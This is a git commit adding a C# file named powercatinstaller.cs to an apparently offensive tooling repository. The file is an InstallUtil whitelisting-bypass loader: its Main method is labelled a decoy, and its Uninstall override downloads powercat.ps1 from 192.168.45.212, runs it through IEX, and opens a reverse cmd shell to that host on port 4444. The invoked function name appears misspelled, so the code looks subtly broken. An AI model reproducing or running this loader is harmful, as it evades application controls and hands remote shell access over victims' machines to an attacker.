b3267a88ce5b7910ccc50a95843b28e9a6f5bd62
gerbsec <67713732+gerbsec@users.noreply.github.com>
2024-05-13 22:18:52 -0400

    Create powercatinstaller.cs

---
+++ Offensive-C/powercatinstaller.cs
@@ -0,0 +1,35 @@
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
+
+namespace Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("This is the main method which is a decoy");
+        }
+    }
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            String cmd = "(new-object net.webclient).downloadstring('http://192.168.45.212/powercat.ps1') | IEX ; powersrcatt -c 192.168.45.212 -p 4444 -e cmd";
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+
+            ps.AddScript(cmd);
+
+            ps.Invoke();
+
+            rs.Close();
+        }
+    }
+}
